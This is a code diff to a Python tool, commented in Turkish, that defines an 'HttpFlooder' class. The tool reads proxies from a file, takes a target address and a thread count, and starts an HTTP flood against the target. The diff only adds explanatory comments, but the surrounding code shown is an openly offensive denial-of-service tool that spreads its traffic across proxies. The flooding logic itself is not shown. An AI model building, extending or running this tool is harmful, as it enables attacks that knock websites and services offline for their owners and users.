@@ -6,6 +6,9 @@ import argparse
 import sys
 import os
 
+
+# Gerekli değişkenlerin tanımlanması
+
 DEFAULT_TIMEOUT_SEC = 5
 APPLICATION_VERSION = "1.1.0"
 PROXY_ARRAY = []
@@ -120,6 +123,8 @@ logo_text = f"""
 
 
 
+# Gerekli fonksyionların tanımlanması
+
 def t_debug(text:str) -> None:
     print(f"[ *DEBUG* ]: {text}.")
 
@@ -155,10 +160,17 @@ argParser.add_argument("--thread",required=True,type=int,help="Total job/seconds
 arg_list = vars(argParser.parse_args())
 
 
+
+# Parametrelerin alınması
+
 PROXY_TYPE = arg_list["type"]
 TARGET_ADRES = arg_list["target"]
 TOTAL_THREAD = arg_list["thread"]
 PROXY_FILE = arg_list["file"]
+
+
+
+# Program içerisinde gereken değişkenlerin kontrolü
 
 if PROXY_TYPE not in [ "http", "https"]:
     t_error("Desteklenmeyen proxy tipi, işlem iptal edildi")
@@ -173,6 +185,7 @@ if not os.path.exists(PROXY_FILE) or not os.path.isfile(PROXY_FILE):
 
 
 
+# Programın ana sınıfının tanımlanması
 
 class HttpFlooder():
     def __init__(self, proxy_array, proxy_type:str):
@@ -249,7 +262,7 @@ class HttpFlooder():
 
 
 
-
+# Proxy dosyasından gerekli proxylier belleğe alınır
 t_info("Proxy dosyası açılıyor")
 with open(PROXY_FILE, "r") as proxyFile:
     for line in proxyFile:
@@ -258,7 +271,7 @@ with open(PROXY_FILE, "r") as proxyFile:
 t_info("Proxyler belleğe alındı")    
 
 
-
+# araç sınıfı tanımlanır ve işlem başlatılır 
 httpFloodToolkit = HttpFlooder(PROXY_ARRAY,PROXY_TYPE)
 httpFloodToolkit.startFlood(timeOut=DEFAULT_TIMEOUT_SEC,targetAddres=TARGET_ADRES)
 
